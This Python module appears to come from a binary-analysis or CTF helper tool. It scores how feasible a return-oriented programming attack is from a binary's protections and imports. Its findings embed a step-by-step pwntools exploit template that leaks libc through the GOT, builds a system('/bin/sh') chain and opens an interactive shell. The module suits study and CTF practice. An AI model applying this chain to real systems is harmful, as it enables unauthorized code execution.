"""
rop.py — Detect Return-Oriented Programming (ROP) applicability.
"""

from __future__ import annotations
from ..models import VulnerabilityMatch, Difficulty

DANGEROUS_INPUT = {
    "gets", "scanf", "__isoc99_scanf", "strcpy", "strcat",
    "sprintf", "read", "recv",
}


def classify_rop(ctx: dict) -> list[VulnerabilityMatch]:
    """Assess ROP chain feasibility."""
    imports = set(ctx["imported_functions"])
    prot = ctx["protections"]
    sections = ctx["sections"]
    evidence, confidence = [], 0.0

    if prot.nx.value != "Enabled":
        return []

    evidence.append("NX is ENABLED — code injection blocked; ROP is the standard bypass")
    confidence += 0.20

    dangerous = imports & DANGEROUS_INPUT
    if dangerous:
        evidence.append(f"Overflow-capable input functions: {', '.join(sorted(dangerous))}")
        confidence += 0.25
    else:
        confidence += 0.05

    if prot.canary.value == "Disabled":
        evidence.append("Stack canary DISABLED — return address overwrite is straightforward")
        confidence += 0.15
    else:
        evidence.append("Stack canary ENABLED — must leak or brute-force the canary first")
        confidence -= 0.05

    text_size = 0
    for sec in sections:
        if sec["name"] == ".text":
            text_size = sec["size"]
    if text_size > 50_000:
        evidence.append(f".text section is {text_size:,} bytes — rich gadget set likely")
        confidence += 0.10
    elif text_size > 10_000:
        evidence.append(f".text section is {text_size:,} bytes — moderate gadget availability")
        confidence += 0.05

    libs = ctx.get("dynamic_libs", [])
    if any("libc" in lib for lib in libs):
        evidence.append("libc is linked — ret2libc / one_gadget chains are viable")
        confidence += 0.10

    if prot.pie.value == "Disabled":
        evidence.append("PIE DISABLED — gadget addresses are static")
        confidence += 0.10

    if confidence < 0.30:
        return []

    return [VulnerabilityMatch(
        id=5, name="Return-Oriented Programming (ROP)", category="Code Reuse",
        difficulty=Difficulty.INTERMEDIATE, confidence=min(confidence, 1.0),
        description="Chain short instruction sequences ('gadgets') ending in ret to build arbitrary computation without injecting code. Bypasses NX/DEP.",
        tags=["ROP", "NX bypass", "gadgets"], evidence=evidence,
        recommendations=[
            "Run ROPgadget --binary <file> to enumerate gadgets.",
            "Use pwntools ROP() class for automated chain building.",
            "Classic chain: pop rdi; ret → '/bin/sh' → system (ret2libc).",
            "Consider one_gadget for single-shot shell in libc.",
        ],
        exploit_steps=[
            "Step 1 — Confirm NX is enabled: Run checksec. NX enabled means shellcode injection fails — ROP is the standard bypass.",
            "Step 2 — Find the overflow: Same as stack overflow — find the input function and determine the offset to the return address with a cyclic pattern.",
            "Step 3 — Enumerate gadgets: Use ROPgadget to find useful instruction sequences:\n    ROPgadget --binary <binary> | grep 'pop rdi'\n    ROPgadget --binary <binary> | grep 'pop rsi'\n    ROPgadget --binary <binary> | grep 'ret'",
            "Step 4 — Leak libc base (if PIE/ASLR): Use puts/printf to leak a GOT entry:\n    rop = ROP(elf)\n    rop.puts(elf.got['puts'])  # Leak puts@GOT\n    rop.call(elf.symbols['main'])  # Return to main for 2nd payload\n    p.sendline(b'A' * offset + rop.chain())",
            "Step 5 — Calculate libc addresses:\n    leaked = u64(p.recvline()[:6].ljust(8, b'\\x00'))\n    libc.address = leaked - libc.symbols['puts']\n    system = libc.symbols['system']\n    bin_sh = next(libc.search(b'/bin/sh'))",
            "Step 6 — Build the final ROP chain:\n    rop2 = ROP(libc)\n    rop2.system(bin_sh)   # system('/bin/sh')\n    # or use one_gadget:\n    # payload = b'A' * offset + p64(one_gadget_addr)",
            "Step 7 — Send the second payload:\n    p.sendline(b'A' * offset + rop2.chain())\n    p.interactive()  # Shell!",
            "Step 8 — Stack alignment: If it segfaults on movaps, insert an extra 'ret' gadget before the ROP chain to fix 16-byte alignment.",
        ],
    )]
